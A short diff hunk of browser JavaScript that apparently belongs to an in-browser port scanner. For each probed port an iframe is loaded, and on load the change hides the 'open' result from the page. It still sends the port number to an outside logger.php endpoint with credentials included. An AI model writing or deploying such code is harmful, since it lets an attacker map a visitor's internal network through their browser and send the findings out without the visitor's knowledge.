@@ -8,7 +8,7 @@
             document.body.appendChild(frame);
 
             frame.onload = () => {
-                document.getElementById("out").innerHTML += port+" | open <br />"
+                //document.getElementById("out").innerHTML += port+" | open <br />"
                 fetch("http://php-demo-app-shibli.cfapps.io/logger.php?logs=Port opened ->"+port, {mode:"no-cors", credentials: "include"});
             }
         }
